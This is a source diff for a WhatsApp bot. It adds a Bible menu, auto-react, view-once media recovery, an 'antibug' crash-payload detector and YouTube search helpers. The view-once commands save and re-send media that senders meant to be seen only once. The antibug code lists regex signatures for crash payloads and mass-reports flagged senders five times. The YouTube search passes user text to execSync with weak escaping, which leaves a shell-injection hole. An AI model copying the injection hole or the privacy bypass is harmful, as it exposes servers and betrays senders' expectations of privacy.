+!bible matthieu
+!bible psaumes
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
+"La parole de Dieu est vivante"`;
+
+    await sendWithImage(sock, remoteJid, 'bible', menuText);
+    return;
+  }
+
+  const commande = args[0].toLowerCase();
+
+  // Liste de l'Ancien Testament
+  if (commande === 'ancien') {
+    let texte = `╔═══════════════════════════════════╗
+║   📜 𝗔𝗡𝗖𝗜𝗘𝗡 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧    ║
+╚═══════════════════════════════════╝
+
+📚 *39 livres de l'Ancien Testament:*
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📖 *PENTATEUQUE (5):*
+1. Genèse (50 ch.)
+2. Exode (40 ch.)
+3. Lévitique (27 ch.)
+4. Nombres (36 ch.)
+5. Deutéronome (34 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📖 *LIVRES HISTORIQUES (12):*
+6. Josué (24 ch.)
+7. Juges (21 ch.)
+8. Ruth (4 ch.)
+9. 1 Samuel (31 ch.)
+10. 2 Samuel (24 ch.)
+11. 1 Rois (22 ch.)
+12. 2 Rois (25 ch.)
+13. 1 Chroniques (29 ch.)
+14. 2 Chroniques (36 ch.)
+15. Esdras (10 ch.)
+16. Néhémie (13 ch.)
+17. Esther (10 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📖 *LIVRES POÉTIQUES (5):*
+18. Job (42 ch.)
+19. Psaumes (150 ch.)
+20. Proverbes (31 ch.)
+21. Ecclésiaste (12 ch.)
+22. Cantique des Cantiques (8 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📖 *GRANDS PROPHÈTES (5):*
+23. Ésaïe (66 ch.)
+24. Jérémie (52 ch.)
+25. Lamentations (5 ch.)
+26. Ézéchiel (48 ch.)
+27. Daniel (12 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📖 *PETITS PROPHÈTES (12):*
+28. Osée (14 ch.)
+29. Joël (3 ch.)
+30. Amos (9 ch.)
+31. Abdias (1 ch.)
+32. Jonas (4 ch.)
+33. Michée (7 ch.)
+34. Nahum (3 ch.)
+35. Habacuc (3 ch.)
+36. Sophonie (3 ch.)
+37. Aggée (2 ch.)
+38. Zacharie (14 ch.)
+39. Malachie (4 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;
+
+    await sendWithImage(sock, remoteJid, 'bible', texte);
+    return;
+  }
+
+  // Liste du Nouveau Testament
+  if (commande === 'nouveau') {
+    let texte = `╔═══════════════════════════════════╗
+║   ✝️ 𝗡𝗢𝗨𝗩𝗘𝗔𝗨 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧  ║
+╚═══════════════════════════════════╝
+
+📚 *27 livres du Nouveau Testament:*
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✝️ *ÉVANGILES (4):*
+1. Matthieu (28 ch.)
+2. Marc (16 ch.)
+3. Luc (24 ch.)
+4. Jean (21 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✝️ *HISTOIRE (1):*
+5. Actes des Apôtres (28 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✝️ *ÉPÎTRES DE PAUL (13):*
+6. Romains (16 ch.)
+7. 1 Corinthiens (16 ch.)
+8. 2 Corinthiens (13 ch.)
+9. Galates (6 ch.)
+10. Éphésiens (6 ch.)
+11. Philippiens (4 ch.)
+12. Colossiens (4 ch.)
+13. 1 Thessaloniciens (5 ch.)
+14. 2 Thessaloniciens (3 ch.)
+15. 1 Timothée (6 ch.)
+16. 2 Timothée (4 ch.)
+17. Tite (3 ch.)
+18. Philémon (1 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✝️ *ÉPÎTRES GÉNÉRALES (8):*
+19. Hébreux (13 ch.)
+20. Jacques (5 ch.)
+21. 1 Pierre (5 ch.)
+22. 2 Pierre (3 ch.)
+23. 1 Jean (5 ch.)
+24. 2 Jean (1 ch.)
+25. 3 Jean (1 ch.)
+26. Jude (1 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✝️ *APOCALYPSE (1):*
+27. Apocalypse (22 ch.)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;
+
+    await sendWithImage(sock, remoteJid, 'bible', texte);
+    return;
+  }
+
+  // Liste complète
+  if (commande === 'liste') {
+    let texte = `╔═══════════════════════════════════╗
+║     📖 𝗟𝗔 𝗕𝗜𝗕𝗟𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘    ║
+╚═══════════════════════════════════╝
+
+📊 *Composition de la Bible:*
+
+📜 Ancien Testament: 39 livres
+✝️ Nouveau Testament: 27 livres
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📚 *TOTAL: 66 livres*
+
+💡 *Pour voir la liste détaillée:*
+• !bible ancien - Voir les 39 livres
+• !bible nouveau - Voir les 27 livres
+
+📖 *Pour info sur un livre:*
+• !bible [nom du livre]
+• : !bible genese
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✨ *Quelques statistiques:*
+• Plus long livre: Psaumes (150 ch.)
+• Plus court: 2 Jean, 3 Jean, Jude (1 ch.)
+• Premier livre: Genèse
+• Dernier livre: Apocalypse
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
+"Toute Écriture est inspirée de Dieu"`;
+
+    await sendWithImage(sock, remoteJid, 'bible', texte);
+    return;
+  }
+
+  // Recherche d'un livre spécifique
+  const livreRecherche = commande.toLowerCase().replace(/\s/g, '');
+  const livre = touteLaBible[livreRecherche];
+
+  if (livre) {
+    const testament = livre.testament === 'Ancien' ? '📜 Ancien Testament' : '✝️ Nouveau Testament';
+    const texte = `╔═══════════════════════════════════╗
+║        📖 ${livre.nom.toUpperCase()}        ║
+╚═══════════════════════════════════╝
+
+${testament}
+
+📊 *Informations:*
+• Nombre de chapitres: ${livre.chapitres}
+• Testament: ${livre.testament}
+
+💡 *Pour lire ce livre:*
+Utilisez votre Bible ou une application
+de lecture biblique.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;
+
+    await sendWithImage(sock, remoteJid, 'bible', texte);
+  } else {
+    await sock.sendMessage(remoteJid, {
+      text: `❌ Livre "${args[0]}" non trouvé.\n\nUtilisez !bible liste pour voir tous les livres disponibles.`
+    });
+  }
+}
+
+async function handleLeave(sock, remoteJid, isGroup, senderJid) {
+  if (!isGroup) {
+    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+    return;
+  }
+
+  if (!isAdmin(senderJid)) {
+    await sock.sendMessage(remoteJid, { text: '\u26D4 Admins du bot uniquement.' });
+    return;
+  }
+
+  await sock.sendMessage(remoteJid, { 
+    text: `\u250C\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2510
+Sayonara everyone
+\u2514\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2518
+\uD83D\uDCA0 _Bot leave. See you soon!_`
+  });
+  await delay(2000);
+  await sock.groupLeave(remoteJid);
+}
+
+async function handleAutoReactCommand(sock, args, remoteJid, senderJid) {
+  if (!isAdmin(senderJid)) {
+    await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+    return;
+  }
+
+  if (args.length === 0) {
+    await sock.sendMessage(remoteJid, {
+      text: `⚙️ *Auto-React*\n\nStatut: ${autoReact ? '✅ ON' : '❌ OFF'}\n\n${config.prefix}autoreact on/off\n${config.prefix}autoreact list\n${config.prefix}autoreact add <mot> <emoji>\n${config.prefix}autoreact remove <mot>`
+    });
+    return;
+  }
+
+  const subCommand = args[0].toLowerCase();
+
+  switch (subCommand) {
+    case 'on':
+      autoReact = true;
+      saveData();
+      await sock.sendMessage(remoteJid, { text: '✅ Auto-React ACTIVÉ' });
+      break;
+
+    case 'off':
+      autoReact = false;
+      saveData();
+      await sock.sendMessage(remoteJid, { text: '❌ Auto-React DÉSACTIVÉ' });
+      break;
+
+    case 'list':
+      const wordList = Object.entries(autoreactWords)
+        .map(([word, emoji]) => `• ${word} → ${emoji}`)
+        .join('\n');
+      await sock.sendMessage(remoteJid, {
+        text: `📝 *Mots*:\n\n${wordList || 'Aucun'}`
+      });
+      break;
+
+    case 'add':
+      if (args.length < 3) {
+        await sock.sendMessage(remoteJid, {
+          text: `❌ Format: ${config.prefix}autoreact add <mot> <emoji>`
+        });
+        return;
+      }
+      const wordToAdd = args[1].toLowerCase();
+      const emojiToAdd = args.slice(2).join(' ');
+      autoreactWords[wordToAdd] = emojiToAdd;
+      saveData();
+      await sock.sendMessage(remoteJid, {
+        text: `✅  : "${wordToAdd}" → ${emojiToAdd}`
+      });
+      break;
+
+    case 'remove':
+      if (args.length < 2) {
+        await sock.sendMessage(remoteJid, {
+          text: `❌ Format: ${config.prefix}autoreact remove <mot>`
+        });
+        return;
+      }
+      const wordToRemove = args[1].toLowerCase();
+      if (autoreactWords[wordToRemove]) {
+        delete autoreactWords[wordToRemove];
+        saveData();
+        await sock.sendMessage(remoteJid, {
+          text: `✅  : "${wordToRemove}"`
+        });
+      } else {
+        await sock.sendMessage(remoteJid, {
+          text: `❌ Mot non trouvé`
+        });
+      }
+      break;
+
+    default:
+      await sock.sendMessage(remoteJid, {
+        text: `❌ Sous-commande inconnue`
+      });
+  }
+}
+
+async function handleViewOnceCommand(sock, message, args, remoteJid, senderJid) {
+  const sub = args[0]?.toLowerCase();
+
+  // ─── VV (sans argument ou "last") = plusieurs cas ────────────────────────
+  if (!sub || sub === 'last') {
+
+    // CAS 1 : L'user répond (!vv en reply) à un message avec média → l'extraire directement
+    const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+    if (quoted) {
+      try {
+        let mediaData = null, mediaType = '', mimetype = '', isGif = false;
+
+        // Vérifier si c'est un viewOnce en reply
+        const qViewOnce = quoted.viewOnceMessageV2 || quoted.viewOnceMessageV2Extension;
+        const qImage    = qViewOnce?.message?.imageMessage || quoted.imageMessage;
+        const qVideo    = qViewOnce?.message?.videoMessage || quoted.videoMessage;
+
+        if (qImage) {
+          mediaType = 'image'; mimetype = qImage.mimetype || 'image/jpeg';
+          const stream = await downloadContentFromMessage(qImage, 'image');
+          mediaData = await toBuffer(stream);
+        } else if (qVideo) {
+          mediaType = 'video'; mimetype = qVideo.mimetype || 'video/mp4';
+          isGif = qVideo.gifPlayback || false;
+          const stream = await downloadContentFromMessage(qVideo, 'video');
+          mediaData = await toBuffer(stream);
+        }
+
+        if (mediaData && mediaData.length > 100) {
+          await sendVVMedia(sock, remoteJid, {
+            type: mediaType, buffer: mediaData, mimetype, isGif, ptt: false,
+            timestamp: Date.now(), sender: senderJid, size: mediaData.length, fromJid: senderJid
+          }, 1, 1);
+          return;
+        }
+      } catch(e) {
+        console.error('[VV reply extract]', e.message);
+      }
+    }
+
+    // CAS 2 : Chercher dans le cache View Once auto-sauvegardé
+    const all = [];
+    for (const [jid, items] of savedViewOnce.entries()) {
+      items.forEach(item => all.push({ ...item, fromJid: jid }));
+    }
+    if (all.length === 0) {
+      await sock.sendMessage(remoteJid, {
+        text: `👁️ *  - View Once*
+
+❌ *    *
+
+📌 *   *
+
+* 1:*       "Vue Unique" (View Once)  
+* 2:*    /  \`!vv\`  
+
+📋 *:*
+• \`!vv\` —   
+• \`!vv list\` —  
+• \`!vv get 1\` —  `
+      });
+      return;
+    }
+    all.sort((a, b) => b.timestamp - a.timestamp);
+    await sendVVMedia(sock, remoteJid, all[0], 1, all.length);
+    return;
+  }
+
+  // ─── VV LIST ────────────────────────────────────────────────────────────────
+  if (sub === 'list') {
+    const all = [];
+    for (const [jid, items] of savedViewOnce.entries()) {
+      items.forEach(item => all.push({ ...item, fromJid: jid }));
+    }
+    all.sort((a, b) => b.timestamp - a.timestamp);
+
+    if (all.length === 0) {
+      await sock.sendMessage(remoteJid, {
+        text: `👁️ * View Once*\n\n📭    `
+      });
+      return;
+    }
+
+    let listText = `┏━━━  👁️  View Once  👁️  ━━━┓\n\n`;
+    listText += `📦 * : ${all.length}*\n\n`;
+    all.forEach((item, i) => {
+      const date = new Date(item.timestamp).toLocaleString('ar-SA', {
+        timeZone: 'America/Port-au-Prince',
+        day: '2-digit', month: '2-digit',
+        hour: '2-digit', minute: '2-digit'
+      });
+      const icon = item.type === 'image' ? '📸' : item.type === 'video' ? '🎥' : '🎵';
+      const from = item.fromJid.split('@')[0];
+      listText += `${icon} *${i + 1}.* : +${from}\n   📅 ${date}\n   📏 ${(item.size / 1024).toFixed(0)} KB\n\n`;
+    });
+    listText += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n`;
+    listText += `📌 *:* ${config.prefix}vv get []\n`;
+    listText += `📌 *:* ${config.prefix}vv last\n`;
+    listText += `📌 *:* ${config.prefix}vv clear\n`;
+    listText += `📌 * :* ${config.prefix}vv del []`;
+
+    await sock.sendMessage(remoteJid, { text: listText });
+    return;
+  }
+
+  // ─── VV GET <n> ─────────────────────────────────────────────────────────────
+  if (sub === 'get') {
+    const idx = parseInt(args[1]) - 1;
+    const all = [];
+    for (const [jid, items] of savedViewOnce.entries()) {
+      items.forEach(item => all.push({ ...item, fromJid: jid }));
+    }
+    all.sort((a, b) => b.timestamp - a.timestamp);
+
+    if (isNaN(idx) || idx < 0 || idx >= all.length) {
+      await sock.sendMessage(remoteJid, {
+        text: `❌   \n\n: ${config.prefix}vv get 1\n: 1 - ${all.length}`
+      });
+      return;
+    }
+
+    await sendVVMedia(sock, remoteJid, all[idx], idx + 1, all.length);
+    return;
+  }
+
+  // ─── VV DEL <n> ─────────────────────────────────────────────────────────────
+  if (sub === 'del' && args[1]) {
+    const idx = parseInt(args[1]) - 1;
+    const all = [];
+    for (const [jid, items] of savedViewOnce.entries()) {
+      items.forEach((item, i) => all.push({ ...item, fromJid: jid, arrIdx: i }));
+    }
+    all.sort((a, b) => b.timestamp - a.timestamp);
+
+    if (isNaN(idx) || idx < 0 || idx >= all.length) {
+      await sock.sendMessage(remoteJid, {
+        text: `❌    (1 - ${all.length})`
+      });
+      return;
+    }
+
+    const target = all[idx];
+    const userArr = savedViewOnce.get(target.fromJid) || [];
+    userArr.splice(target.arrIdx, 1);
+    if (userArr.length === 0) savedViewOnce.delete(target.fromJid);
+    else savedViewOnce.set(target.fromJid, userArr);
+    saveStoreKey('viewonce');
+
+    await sock.sendMessage(remoteJid, {
+      text: `✅    #${idx + 1}  `
+    });
+    return;
+  }
+
+  // ─── VV CLEAR ───────────────────────────────────────────────────────────────
+  if (sub === 'clear') {
+    const total = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
+    savedViewOnce.clear();
+    saveStoreKey('viewonce');
+    await sock.sendMessage(remoteJid, {
+      text: `🗑️     (${total} )`
+    });
+    return;
+  }
+
+  // ─── VV HELP ────────────────────────────────────────────────────────────────
+  await sock.sendMessage(remoteJid, {
+    text: `┏━━━  👁️ View Once Help  👁️  ━━━┓
+
+📌 * :*
+
+👁️ ${config.prefix}vv           →   
+📋 ${config.prefix}vv list       →   
+📥 ${config.prefix}vv get [n]    →  
+🗑️ ${config.prefix}vv del [n]    →  
+🧹 ${config.prefix}vv clear      →  
+🕐 ${config.prefix}vv last       → 
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📦 : ${[...savedViewOnce.values()].reduce((s,a) => s+a.length, 0)}
+
+✨     
+  Vue Unique
+
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+  });
+}
+
+// Envoyer un média VV with infos
+async function sendVVMedia(sock, remoteJid, item, num, total) {
+  try {
+    const date = new Date(item.timestamp).toLocaleString('ar-SA', {
+      timeZone: 'America/Port-au-Prince',
+      day: '2-digit', month: '2-digit', year: 'numeric',
+      hour: '2-digit', minute: '2-digit'
+    });
+    const from = item.fromJid.split('@')[0];
+    const caption = '';
+
+    if (item.type === 'image') {
+      await sock.sendMessage(remoteJid, {
+        image: item.buffer,
+        caption
+      });
+    } else if (item.type === 'video') {
+      await sock.sendMessage(remoteJid, {
+        video: item.buffer,
+        caption,
+        gifPlayback: item.isGif || false
+      });
+    } else if (item.type === 'audio') {
+      await sock.sendMessage(remoteJid, {
+        audio: item.buffer,
+        ptt: false,
+        mimetype: item.mimetype || 'audio/ogg; codecs=opus',
+        audioPlayback: true
+      });
+    }
+  } catch (e) {
+    console.error(' sendVVMedia:', e);
+    await sock.sendMessage(remoteJid, { text: `❌    : ${e.message}` });
+  }
+}
+
+// =============================================
+// =============================================
+
+// Signatures de payloads malveillants connus
+const BUG_SIGNATURES = {
+  // Caractères arabes crashants (U+0600–U+0605, U+202E RTL, etc.)
+  arabicCrash: /[\u0600-\u0605\u200E\u200F\u202A-\u202E\u2066-\u2069]{10,}/,
+  // Flood d'emojis (>200 emojis consécutifs)
+  emojiFlood: /(\p{Emoji_Presentation}|\p{Extended_Pictographic}){50,}/u,
+  // Caractères invisibles en masse (zero-width)
+  invisibleChars: /[\u200B-\u200D\uFEFF\u180E\u034F]{20,}/,
+  // Zalgo / caractères combinants excessifs
+  zalgo: /[\u0300-\u036F\u0489\u1DC0-\u1DFF]{15,}/,
+  // Chaînes extrêmement longues (>5000 chars d'un seul message)
+  massiveText: null, // géré par longueur
+  // Caractères CJK en masse (chinois crashant)
+  cjkFlood: /[\u4E00-\u9FFF\u3400-\u4DBF]{200,}/,
+  // RTL override massif
+  rtlOverride: /\u202E{3,}/,
+  // Null bytes / caractères de contrôle
+  controlChars: /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]{5,}/,
+};
+
+// Détection dans le contenu du message (texte + métadonnées)
+function detectBugPayload(message, messageText) {
+  try {
+    // 1. Analyser le texte principal
+    const text = messageText || '';
+
+    // Longueur excessive
+    if (text.length > 5000) {
+      return { type: 'MASSIVE_TEXT', detail: `${text.length} caractères`, severity: 'HIGH' };
+    }
+
+    // Vérifier chaque signature
+    for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
+      if (regex && regex.test(text)) {
+        return { type: name.toUpperCase(), detail: 'Payload malveillant détecté', severity: 'HIGH' };
+      }
+    }
+
+    // 2. Analyser les métadonnées du message (contextInfo malveillant)
+    const ctx = message.message?.extendedTextMessage?.contextInfo;
+    if (ctx) {
+      // Thumbnail URL corrompue
+      const extAd = ctx.externalAdReply;
+      if (extAd) {
+        const title = extAd.title || '';
+        const body = extAd.body || '';
+        if (title.length > 2000 || body.length > 2000) {
+          return { type: 'MALICIOUS_CONTEXT', detail: 'externalAdReply corrompu', severity: 'HIGH' };
+        }
+        // Vérifier les payloads dans le titre/body
+        for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
+          if (regex && (regex.test(title) || regex.test(body))) {
+            return { type: `CONTEXT_${name.toUpperCase()}`, detail: 'Payload dans contextInfo', severity: 'HIGH' };
+          }
+        }
+      }
+    }
+
+    // 3. Détecter les messages viewOnce with contenu malveillant
+    const vv = message.message?.viewOnceMessageV2 || message.message?.viewOnceMessageV2Extension;
+    if (vv) {
+      const innerCtx = vv.message?.extendedTextMessage?.contextInfo?.externalAdReply;
+      if (innerCtx?.title?.length > 1000) {
+        return { type: 'VIEWONCE_EXPLOIT', detail: 'ViewOnce with payload', severity: 'CRITICAL' };
+      }
+    }
+
+    // 4. Détecter les stickers malveillants (payload dans webpUrl)
+    const sticker = message.message?.stickerMessage;
+    if (sticker?.url && sticker.url.length > 500) {
+      return { type: 'STICKER_EXPLOIT', detail: 'Sticker with URL suspecte', severity: 'MEDIUM' };
+    }
+
+    // 5. Flood de mentions (>20 mentions = attaque)
+    const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+    if (mentions.length > 20) {
+      return { type: 'MENTION_FLOOD', detail: `${mentions.length} mentions`, severity: 'HIGH' };
+    }
+
+  } catch (e) {
+    console.error(' detectBugPayload:', e);
+    return null;
+  }
+}
+
+async function handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugInfo) {
+  const senderNum = senderJid.split('@')[0];
+  const now = Date.now();
+
+
+  // 1. Supprimer immédiatement le message malveillant
+  try {
+    await sock.sendMessage(remoteJid, { delete: message.key });
+  } catch (e) { /* peut échouer si pas admin groupe */ }
+
+  // 2. Mettre à jour le tracker
+  const existing = antiBugTracker.get(senderJid) || { count: 0, firstSeen: now, lastSeen: now, blocked: false, attacks: [] };
+  existing.count++;
+  existing.lastSeen = now;
+  existing.attacks.push({ type: bugInfo.type, detail: bugInfo.detail, severity: bugInfo.severity, timestamp: now });
+  antiBugTracker.set(senderJid, existing);
+
+  // 3. Si déjà bloqué, ignorer silencieusement
+  if (existing.blocked) {
+    return;
+  }
+
+  // 4. Alerte dans le chat
+  const severityEmoji = bugInfo.severity === 'CRITICAL' ? '☠️' : bugInfo.severity === 'HIGH' ? '🔴' : '🟡';
+
+  await sock.sendMessage(remoteJid, {
+    text: `┏━━━  🛡️   -   🛡️  ━━━┓
+
+${severityEmoji} *    !*
+
+📱 : @${senderNum}
+🔍  : ${bugInfo.type}
+📊 : ${bugInfo.detail}
+⚠️ : ${bugInfo.severity}
+🔢  : ${existing.count}/5
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🗑️    
+${existing.count >= 5 ? '🔒   ...' : `⚠️ ${5 - existing.count} ()   `}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
+    mentions: [senderJid]
+  });
+
+  // 5. Si 5 attaques ou CRITICAL → action immédiate
+  if (existing.count >= 5 || bugInfo.severity === 'CRITICAL') {
+    existing.blocked = true;
+    antiBugTracker.set(senderJid, existing);
+
+    // a. Signaler 5 fois à WhatsApp
+    await reportToWhatsApp(sock, senderJid, senderNum, existing.attacks);
+
+    // b. Bloquer le contact
+    try {
+      await sock.updateBlockStatus(senderJid, 'block');
+    } catch (e) {
+      console.error(' blocage:', e);
+    }
+
+    // c. Si groupe → expulser
+    if (isGroup) {
+      try {
+        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
+        if (botIsAdmin) {
+          await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
+        }
+      } catch (e) { /* silencieux */ }
+    }
+
+    // d. Message de confirmation
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  ✅     ✅  ━━━┓
+
+☠️ *   :*
+
+📱 : +${senderNum}
+🔒 :  
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅     (5 )
+✅   
+${isGroup ? '✅    ' : ''}
+✅     
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 * :*
+${existing.attacks.slice(-3).map((a, i) => `${i + 1}. ${a.type} - ${a.severity}`).join('\n')}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
+*    -  *`,
+      mentions: [senderJid]
+    });
+
+    // e. Notifier l'admin du bot en privé
+    for (const adminJid of config.adminNumbers) {
+      try {
+        await sock.sendMessage(adminJid, {
+          text: `🚨 *  *\n\n☠️  ${bugInfo.severity}  !\n\n📱 : +${senderNum}\n📍 : ${isGroup ? '' : ' '}\n🔍 : ${bugInfo.type}\n🔢 : ${existing.count}\n\n✅ :  +   + ${isGroup ? ' + ' : ''}`
+        });
+      } catch (e) { /* silencieux */ }
+    }
+  }
+}
+
+// Envoyer des signalements à WhatsApp (5 fois)
+async function reportToWhatsApp(sock, senderJid, senderNum, attacks) {
+
+  const reportReasons = [
+    'spam',          // Spam
+    'inappropriate', // Contenu inapproprié
+    'harassment',    // Harcèlement
+    'threat',        // Menace
+    'other'          // Autre
+  ];
+
+  for (let i = 0; i < 5; i++) {
+    try {
+      // Signalement via l'API Baileys
+      await sock.reportJid(senderJid, 'spam');
+      await delay(800); // Délai entre chaque signalement
+    } catch (e) {
+      // Si reportJid n'existe pas, utiliser sendMessage vers le support WhatsApp
+      try {
+        await sock.sendMessage('0@s.whatsapp.net', {
+        });
+      } catch (e2) {
+      }
+      await delay(500);
+    }
+  }
+
+}
+
+// Commande !antibug (toggle + status + liste)
+async function handleAntiBugCommand(sock, args, remoteJid, senderJid) {
+  const sub = args[0]?.toLowerCase();
+
+  // !antibug list → liste des attaquants détectés
+  if (sub === 'list') {
+    if (antiBugTracker.size === 0) {
+      await sock.sendMessage(remoteJid, {
+        text: `🛡️ *  *\n\n✅    `
+      });
+      return;
+    }
+
+    let listText = `┏━━━  🛡️    🛡️  ━━━┓\n\n`;
+    let i = 1;
+    for (const [jid, data] of antiBugTracker.entries()) {
+      const num = jid.split('@')[0];
+      const date = new Date(data.lastSeen).toLocaleString('ar-SA', { timeZone: 'America/Port-au-Prince' });
+      const status = data.blocked ? '🔒 ' : `⚠️ ${data.count} `;
+      listText += `${i}. +${num}\n   ${status} | ${data.attacks[0]?.type || '?'}\n   📅 ${date}\n\n`;
+      i++;
+    }
+    listText += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n`;
+    listText += `📊 : ${antiBugTracker.size} ()`;
+
+    await sock.sendMessage(remoteJid, { text: listText });
+    return;
+  }
+
+  // !antibug clear → vider le tracker
+  if (sub === 'clear') {
+    const count = antiBugTracker.size;
+    antiBugTracker.clear();
+    await sock.sendMessage(remoteJid, {
+      text: `🗑️     (${count} )`
+    });
+    return;
+  }
+
+  // !antibug unblock <number> → débloquer manuellement
+  if (sub === 'unblock' && args[1]) {
+    const num = args[1].replace(/[^0-9]/g, '');
+    const jid = num + '@s.whatsapp.net';
+    try {
+      await sock.updateBlockStatus(jid, 'unblock');
+      antiBugTracker.delete(jid);
+      await sock.sendMessage(remoteJid, {
+        text: `✅     +${num}`
+      });
+    } catch (e) {
+      await sock.sendMessage(remoteJid, {
+        text: `❌    : ${e.message}`
+      });
+    }
+    return;
+  }
+
+  // !antibug (sans argument) → toggle ON/OFF
+  antiBug = !antiBug;
+  saveStoreKey('config');
+
+  const statusEmoji = antiBug ? '✅' : '❌';
+  const statusText  = antiBug ? '' : '';
+
+  await sock.sendMessage(remoteJid, {
+    text: `┏━━━  🛡️    🛡️  ━━━┓
+
+${statusEmoji} *: ${statusText}*
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 *  :*
+
+☠️    (Crash)
+🐛    (>50)
+👻    (>20)
+🌀  Zalgo ()
+📏   (>5000 )
+🀄    (>200)
+↪️ RTL Override 
+📌 Mentions  (>20)
+🖼️ ContextInfo 
+👁️ ViewOnce  Payload
+🎯 Sticker URL 
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *  :*
+
+1️⃣   
+2️⃣   
+3️⃣  5 :
+   • 📨 5  
+   • 🔒  
+   • 🚫   
+   • 📲  
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 * :*
+
+• !antibug list     →  
+• !antibug clear    →  
+• !antibug unblock [] →  
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🛡️  : ${antiBugTracker.size}
+🔒 : ${[...antiBugTracker.values()].filter(v => v.blocked).length}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+  });
+}
+
+// =============================================
+// 📥 FONCTIONS DE DOWNLOAD
+// =============================================
+// Dépendances requises (à installer sur votre serveur):
+//   npm install @distube/ytdl-core play-dl node-fetch
+// =============================================
+
+// Importer dynamiquement pour éviter crash si non installé
+async function getYtdl() {
+  try { return (await import('@distube/ytdl-core')).default; }
+  catch { return null; }
+}
+async function getPlayDl() {
+  try { return await import('play-dl'); }
+  catch { return null; }
+}
+async function getFetch() {
+  try { return (await import('node-fetch')).default; }
+  catch {
+    try { return (await import('axios')).default; }
+    catch { return null; }
+  }
+}
+
+// ─── Extraire videoId depuis URL YouTube ─────────────────────────────────────
+function extractYouTubeId(url) {
+  const m = url.match(/(?:youtu\.be\/|v=|embed\/)([\w-]{11})/);
+  return m ? m[1] : null;
+}
+
+// ─── Recherche YouTube via yt-dlp ─────────────────────────────────────────────
+async function searchYouTubeId(query) {
+  // Si c'est déjà un lien YouTube, extraire l'ID directement
+  if (query.includes('youtu.be') || query.includes('youtube.com')) {
+    const id = extractYouTubeId(query);
+    if (id) return id;
+  }
+  // Recherche via yt-dlp
+  try {
+    const { execSync } = await import('child_process');
+    const result = execSync(
+      'yt-dlp "ytsearch1:' + query.replace(/"/g, '') + '" --print id --no-playlist --quiet',
+      { timeout: 15000, encoding: 'utf8' }
+    ).trim();
+    if (result && result.length === 11) return result;
+  } catch(e) { console.log('[YT SEARCH yt-dlp]', e.message); }
+  // Fallback scraping YouTube
+  try {
+    const r = await axios.get('https://www.youtube.com/results?search_query=' + encodeURIComponent(query), {
+      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }, timeout: 10000
+    });
+    const m = r.data.match(/"videoId":"([\w-]{11})"/);
+    if (m) return m[1];
+  } catch(e) {}
